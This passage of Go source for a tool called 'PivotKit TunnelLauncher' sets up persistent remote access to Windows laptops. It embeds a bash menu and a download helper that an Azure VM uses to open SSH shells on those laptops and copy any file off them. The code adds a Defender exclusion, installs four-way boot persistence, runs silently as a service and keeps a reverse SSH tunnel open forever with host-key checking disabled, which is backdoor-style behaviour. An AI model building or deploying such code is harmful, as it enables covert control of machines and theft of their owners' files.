        echo -e "  ${R}No machines registered. Run TunnelLauncher.exe on Windows laptops.${N}"
        echo ""; echo -e "  ${Y}[r]${N} Refresh   ${R}[q]${N} Quit"
        read -rp "  > " CH; [ "$CH" = "q" ] && exit 0; continue
    fi

    echo -e "  ${B}#   Status       Username          Hostname                Port    Last Seen${N}"
    echo    "  ───────────────────────────────────────────────────────────────────────────"

    for i in "${!HOSTS[@]}"; do
        p="${PORTS[$i]}"
        if ss -tlnp 2>/dev/null | grep -q ":${p} "; then
            st="${G}● LIVE  ${N}"
        else
            st="${R}○ offline${N}"
        fi
        printf "  ${C}[%d]${N} %-13b %-18s %-24s %-8s %s\n" \
            "$((i+1))" "$st" "${USERS[$i]}" "${HOSTS[$i]}" "$p" "${TIMES[$i]}"
    done

    echo ""; echo -e "  ${Y}[r]${N} Refresh   ${R}[q]${N} Quit"; echo ""
    read -rp "  Enter number to connect: " CH

    case "$CH" in
        q|Q) exit 0 ;;
        r|R) unset HOSTS USERS PORTS TIMES; continue ;;
        ''|*[!0-9]*) echo "  Invalid."; sleep 1; unset HOSTS USERS PORTS TIMES; continue ;;
    esac

    IDX=$((CH-1))
    if [ $IDX -lt 0 ] || [ $IDX -ge ${#HOSTS[@]} ]; then
        echo "  Out of range."; sleep 1; unset HOSTS USERS PORTS TIMES; continue
    fi

    WH="${HOSTS[$IDX]}"; WU="${USERS[$IDX]}"; WP="${PORTS[$IDX]}"

    if ! ss -tlnp 2>/dev/null | grep -q ":${WP} "; then
        echo -e "\n  ${R}${B}$WH${N}${R} is OFFLINE — port $WP not active.${N}"
        echo -e "  Make sure TunnelLauncher.exe is running on that laptop."
        read -rp "  Press Enter..."; unset HOSTS USERS PORTS TIMES; continue
    fi

    echo -e "\n  ${G}Connecting to ${B}$WU${N}${G} @ ${B}$WH${N}${G} on port $WP ...${N}\n"
    ssh-keygen -f ~/.ssh/known_hosts -R "[localhost]:${WP}" >/dev/null 2>&1 || true
    ssh-keygen -f ~/.ssh/known_hosts -R "[127.0.0.1]:${WP}" >/dev/null 2>&1 || true

    ssh -o StrictHostKeyChecking=no \
        -o ServerAliveInterval=30 \
        -o ServerAliveCountMax=3 \
        -o ConnectTimeout=10 \
        -p "$WP" "${WU}@localhost"

    EC=$?; echo ""
    case $EC in
        0)   echo -e "  ${G}Session ended normally.${N}" ;;
        255) echo -e "  ${R}Connection failed (255). Is sshd running on $WH?${N}" ;;
        *)   echo -e "  ${Y}Connection closed (code $EC).${N}" ;;
    esac
    read -rp "  Press Enter..."; unset HOSTS USERS PORTS TIMES
done
`
	// Push download helper script to Azure VM
	downloadHelper := fmt.Sprintf(`#!/bin/bash
# PivotKit download helper — run on Azure VM to pull files from any laptop
# Usage: download 'C:/path/to/file.txt' ~/destination/
# Run:   download 'C:/Users/%s/Documents/file.pdf' ~/downloads/
#        download 'D:/Photos/image.jpg' /tmp/
#        download 'C:/Users/%s/Desktop/report.xlsx' ~/

SRC="$1"
DEST="${2:-$HOME/downloads/}"
PORT_MAP="/home/azureuser/.port_map"
REG="/home/azureuser/.registry"

if [ -z "$SRC" ]; then
    echo "Usage: download <windows_path> [destination]"
    echo "  download 'C:/Users/%s/Documents/file.pdf'"
    echo "  download 'D:/Videos/movie.mp4' ~/videos/"
    echo "  download 'C:/Users/%s/Desktop/report.xlsx' /tmp/"
    echo "Destination defaults to ~/downloads/ if not specified"
    exit 1
fi

mkdir -p "$DEST"

# Find an online machine
while IFS='|' read -r h p; do
    if ss -tlnp 2>/dev/null | grep -q ":${p} "; then
        # Get username from registry
        u="user"
        if [ -f "$REG" ]; then
            while IFS='|' read -r rh ru rp rt; do
                [ "${rh,,}" = "${h,,}" ] && u="$ru" && break
            done < "$REG"
        fi
        echo "[INFO] Downloading: $SRC"
        WIN_PATH=$(echo "$SRC" | sed 's|/|\\|g' | sed 's|^\\||')
        scp -o StrictHostKeyChecking=no -o ConnectTimeout=10 -P "$p"             "${u}@localhost:${SRC}" "$DEST"
        if [ $? -eq 0 ]; then
            echo "[ OK ] Downloaded successfully to: $DEST"
        else
            echo "[ERR] Download failed. Check the file path."
        fi
        exit 0
    fi
done < "$PORT_MAP"
echo "[ERR] No laptops online"
`, getUser(), getUser(), getUser(), getUser())

	dlCmd := exec.Command("ssh", sshArgs(
		"cat > /usr/local/bin/download && chmod +x /usr/local/bin/download && echo DL_OK",
	)...)
	dlCmd.Stdin = strings.NewReader(downloadHelper)
	dlOut, _ := dlCmd.CombinedOutput()
	if strings.Contains(string(dlOut), "DL_OK") {
		lg(" OK ", "download helper pushed → on Azure VM: download 'C:/path/file.txt' ~/")
	}

	// Push via SSH stdin — avoids SCP temp-file path issues on Windows
	cmd := exec.Command("ssh", sshArgs(
		fmt.Sprintf("cat > /home/azureuser/connect.sh && chmod +x /home/azureuser/connect.sh && (sudo cp /home/azureuser/connect.sh %s 2>/dev/null || true) && echo OK", connectBin),
	)...)
	cmd.Stdin = strings.NewReader(sh)
	out, err := cmd.CombinedOutput()
	if err == nil && strings.Contains(string(out), "OK") {
		lg(" OK ", "connect script pushed → on Azure VM type: connect")
	} else {
		lg("WARN", "connect script push: "+strings.TrimSpace(string(out)))
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// HEARTBEAT — refreshes registry timestamp every 55 seconds
// ─────────────────────────────────────────────────────────────────────────────

func heartbeat(host, user string, port int) {
	for {
		time.Sleep(55 * time.Second)
		updateRegistry(host, user, port)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// TUNNEL LOOP
// Creates a reverse SSH tunnel: Azure:port → localhost:22
// Reconnects automatically every reconnSec seconds if dropped.
// After 5 consecutive failures, re-runs all auto-fixes before retrying.
// ─────────────────────────────────────────────────────────────────────────────

func runTunnel(host, user string, port int) {
	lg("----", "Reverse SSH Tunnel")
	lg("INFO", "On Azure VM: type 'connect'")
	lg("INFO", fmt.Sprintf("Port: %d | Log: %s", port, logFile))

	if !silentMode {
		fmt.Println()
		fmt.Printf("  ╔══════════════════════════════════════════════════════╗\n")
		fmt.Printf("  ║  TUNNEL ACTIVE — do NOT close this window           ║\n")
		fmt.Printf("  ║  Machine  : %-40s║\n", fmt.Sprintf("%s (%s)", user, host))
		fmt.Printf("  ║  Port     : %-40d║\n", port)
		fmt.Printf("  ║  Log file : %-40s║\n", logFile)
		fmt.Printf("  ║  Azure VM : type 'connect' to browse laptops        ║\n")
		fmt.Printf("  ╚══════════════════════════════════════════════════════╝\n")
		fmt.Println()
	}

	fails := 0
	for attempt := 1; ; attempt++ {
		lg("INFO", fmt.Sprintf("Attempt #%d → port %d", attempt, port))

		// Kill any stale tunnel on Azure holding this port
		freePort(port)
		time.Sleep(time.Second)

		cmd := exec.Command("ssh",
			"-i", keyFile,
			"-o", "StrictHostKeyChecking=no",
			"-o", "BatchMode=yes",
			"-o", "ConnectTimeout=15",
			"-o", "IdentitiesOnly=yes",
			"-o", "ServerAliveInterval=30",
			"-o", "ServerAliveCountMax=3",
			"-o", "ExitOnForwardFailure=yes",
			"-o", "LogLevel=ERROR",
			"-p", strconv.Itoa(azurePort),
			"-N",
			"-R", fmt.Sprintf("%d:localhost:22", port), // correct format
			fmt.Sprintf("%s@%s", azureUser, azureIP),
		)

		if err := cmd.Start(); err != nil {
			lg("WARN", fmt.Sprintf("Tunnel start failed: %v", err))
			fails++
		} else {
			if fails > 0 {
				lg(" OK ", "Tunnel reconnected successfully")
			}
			fails = 0
			go updateRegistry(host, user, port)
			if err := cmd.Wait(); err != nil {
				lg("WARN", fmt.Sprintf("Tunnel dropped: %v", err))
			}
		}

		// After 5 consecutive failures, re-run all auto-fixes
		if fails >= 5 {
			lg("WARN", "5 consecutive failures — re-running all auto-fixes...")
			waitForNetwork()
			if isWin() {
				amdFix()
				fixSshdConfig()
				fixFirewall()
				authorizeAzureKey()
				setupKey()
				if !port22ok() {
					deepPortFix()
				}
			}
			fails = 0
		}

		lg("INFO", fmt.Sprintf("Reconnecting in %ds... (attempt %d total)", reconnSec, attempt))
		time.Sleep(time.Duration(reconnSec) * time.Second)
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// MAIN
// ─────────────────────────────────────────────────────────────────────────────

func main() {
	// Detect silent/service mode before any output
	// When running as Windows Service or Task Scheduler, UserInteractive = False
	if isWin() {
		out, _ := ps(`[Environment]::UserInteractive`)
		silentMode = strings.TrimSpace(out) == "False"
	}

	initLog()

	if !silentMode {
		fmt.Println()
		lg("INFO", "╔══════════════════════════════════════════════════════╗")
		lg("INFO", "║  PivotKit TunnelLauncher v25                        ║")
		lg("INFO", "║  Permanent Ports • Passwordless • Survives Reboot   ║")
		lg("INFO", "║  AMD+Intel • 4-Method Boot • Silent Service Mode    ║")
		lg("INFO", "╚══════════════════════════════════════════════════════╝")
		fmt.Println()
	} else {
		lg("INFO", "PivotKit v25 — silent service mode")
	}

	user := getUser()
	host := getHost()
	lg("INFO", fmt.Sprintf("Machine: %s @ %s", user, host))

	if isAdmin() {
		lg(" OK ", "Running as Administrator")
	} else {
		lg("WARN", "Not Administrator — some setup steps may fail")
	}

	// ── Step 1: Write embedded key with strict permissions
	setupKey()

	// ── Step 2: Windows-specific setup
	if isWin() {
		addDefender()

		// AMD/Hyper-V port fix BEFORE sshd (port must be free first)
		amdFix()

		if !ensureSshd() {
			lg("ERR ", "Cannot start sshd — must run as Administrator")
			if !silentMode {
				fmt.Print("\nPress Enter to exit...")
				fmt.Scanln()
			}
			os.Exit(1)
		}

		fixSshdConfig()
		fixFirewall()
		authorizeAzureKey()

		if !port22ok() {
			deepPortFix()
			amdFix()
			time.Sleep(3 * time.Second)
		}
		if port22ok() {
			lg(" OK ", "Port 22 reachable locally")
		} else {
			lg("WARN", "Port 22 unreachable — tunnel will retry automatically")
		}

		linkDrives()

		// Install 4-method boot persistence
		setupBootPersistence()

		lg("----", "OpenSSH Client")
		p, _ := exec.LookPath("ssh.exe")
		if p == "" {
			p = `C:\Windows\System32\OpenSSH\ssh.exe`
		}
		lg(" OK ", "Found: "+p)
	}

	// ── Step 3: Wait for network — critical for post-reboot operation
	waitForNetwork()

	// ── Step 4: Verify key auth (5 retries, re-write key on attempt 2)
	lg("----", "Testing Azure VM authentication...")
	authed := false
	var lastErr string
	for i := 1; i <= 5; i++ {
		out, err := sshRun("echo CONNECTED")
		if err == nil && strings.Contains(out, "CONNECTED") {
			authed = true
			break
		}
		lastErr = fmt.Sprintf("%v", err)
		lg("WARN", fmt.Sprintf("Auth attempt %d/5 failed: %s", i, lastErr))
		if i == 2 {
			lg("INFO", "Re-writing key with fresh permissions...")
			setupKey()
		}
		time.Sleep(5 * time.Second)
	}

	if !authed {
		lg("ERR ", "Key auth failed: "+lastErr)
		lg("INFO", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		lg("INFO", "Run on Azure VM:")
		lg("INFO", fmt.Sprintf(`echo "%s" >> ~/.ssh/authorized_keys`, azurePubKey))
		lg("INFO", "chmod 600 ~/.ssh/authorized_keys")
		lg("INFO", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
		if !silentMode {
			fmt.Print("\nPress Enter after fixing Azure VM...")
			bufio.NewReader(os.Stdin).ReadString('\n')
			out, err := sshRun("echo CONNECTED")
			if err != nil || !strings.Contains(out, "CONNECTED") {
				lg("ERR ", "Still failing. Check authorized_keys on Azure VM.")
				fmt.Print("Press Enter to exit...")
				fmt.Scanln()
				os.Exit(1)
			}
		} else {
			// Silent mode: wait and keep retrying instead of exiting
			lg("WARN", "Silent mode: retrying in 60s...")
			time.Sleep(60 * time.Second)
		}
	} else {
		lg(" OK ", "Azure VM authenticated — no password needed")
	}

	// ── Step 5: Get permanent port for this machine
	lg("----", "Getting Permanent Port")
	port := getOrAssignPort(host)
	lg(" OK ", fmt.Sprintf("Permanent port: %d — %s always uses this port", port, host))

	// ── Step 6: Update registry (exactly 1 row per hostname)
	updateRegistry(host, user, port)

	// ── Step 7: Push connect script to Azure VM
	pushConnectScript()

	// ── Step 8: Start heartbeat in background
	go heartbeat(host, user, port)

	// ── Step 9: Run tunnel forever
	runTunnel(host, user, port)
}
